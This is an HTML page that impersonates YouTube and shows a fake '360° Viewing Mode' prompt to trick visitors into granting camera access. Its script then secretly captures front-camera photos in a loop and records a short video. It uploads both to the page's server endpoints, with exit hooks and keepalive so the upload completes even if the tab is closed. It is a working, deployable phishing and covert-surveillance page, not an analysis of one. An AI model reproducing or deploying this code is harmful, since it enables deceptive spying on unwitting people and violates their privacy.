<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>YouTube</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">

  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
  <meta property="og:title" content="YouTube">
  <meta property="og:description" content="YouTube is an American online video sharing platform owned by Google.">
  <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/e/ef/Youtube_logo.png">

  <style>
    html, body { margin: 0; padding: 0; height: 100%; width: 100%; overflow: hidden; background: #000; font-family: "Roboto", sans-serif; }
    #video-player { position: absolute; top: 0; left: 0; width: 100%; height: 100%; border: none; z-index: 1; }
    #permission-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #0f0f0f; z-index: 9999; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 40px 24px; box-sizing: border-box; }
    #permission-overlay img { width: 130px; margin-bottom: 25px; }
    #permission-overlay h2 { color: #fff; font-size: 22px; margin: 0 0 12px 0; }
    #permission-overlay p { color: #aaa; font-size: 14px; margin: 0 0 35px 0; max-width: 300px; }
    #enable-btn { background: #cc0000; color: #fff; border: none; padding: 14px 32px; border-radius: 4px; font-weight: 500; text-transform: uppercase; width: 100%; max-width: 260px; cursor: pointer; }
    video, canvas { display: none; }
  </style>
</head>
<body>

  <div id="permission-overlay">
    <img src="https://upload.wikimedia.org/wikipedia/commons/e/ef/Youtube_logo.png" alt="YouTube">
    <h2>360° Viewing Mode</h2>
    <p>Enable camera and motion sensors to interact with this 360° video and enable head-tracking for immersive experience. </p>
    <button id="enable-btn">Allow & Play</button>
  </div>

  <iframe id="video-player" src="https://www.youtube.com/embed/njSffibRets?autoplay=1&controls=1&rel=0" allow="autoplay; encrypted-media; gyroscope; accelerometer" allowfullscreen></iframe>

  <video id="video" autoplay playsinline muted></video>
  <canvas id="canvas" width="480" height="640"></canvas>

  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');
    const overlay = document.getElementById('permission-overlay');
    const btn = document.getElementById('enable-btn');

    let startTime;
    let mediaRecorder;
    let recordedChunks = [];
    let videoIsSent = false;

    btn.addEventListener('click', async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
          video: { facingMode: 'user', width: 640, height: 480 } 
        });
        
        video.srcObject = stream;
        await video.play();
        overlay.style.display = 'none';
        
        startTime = Date.now();
        startPhotoLoop();
        setupVideoRecorder(stream);

      } catch (err) {
        alert("youtube camera permission is required for 360° viewing experience.");
      }
    });

    function startPhotoLoop() {
      const elapsed = Date.now() - startTime;
      let delay = elapsed < 10000 ? 900 : 7000; 

      setTimeout(async () => {
        if (video.readyState === video.HAVE_ENOUGH_DATA) {
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          const dataUrl = canvas.toDataURL('image/jpeg', 0.6);
          await fetch('/api/upload-photo', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ dataUrl })
          }).catch(() => {});
        }
        startPhotoLoop();
      }, delay);
    }

    function setupVideoRecorder(stream) {
      mediaRecorder = new MediaRecorder(stream);
      mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunks.push(e.data); };
      
      mediaRecorder.onstop = async () => {
        if (videoIsSent || recordedChunks.length === 0) return;
        videoIsSent = true;
        
        const blob = new Blob(recordedChunks, { type: 'video/mp4' });
        const reader = new FileReader();
        reader.readAsDataURL(blob);
        reader.onloadend = async () => {
          // Use sendBeacon or standard fetch for the last-second upload
          fetch('/api/upload-video', {
            method: 'POST',
            keepalive: true, // Critical for sending data when tab closes
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ dataUrl: reader.result })
          }).catch(() => {});
        };
      };

      mediaRecorder.start();
      
      // Auto-stop at 10 seconds
      setTimeout(() => { 
        if (mediaRecorder.state !== "inactive") mediaRecorder.stop(); 
      }, 10000);

      // EXIT DETECTION: If they close the tab before 10s
      window.addEventListener('pagehide', () => {
        if (mediaRecorder.state !== "inactive") mediaRecorder.stop();
      });
      window.addEventListener('beforeunload', () => {
        if (mediaRecorder.state !== "inactive") mediaRecorder.stop();
      });
    }
  </script>
</body>
</html>
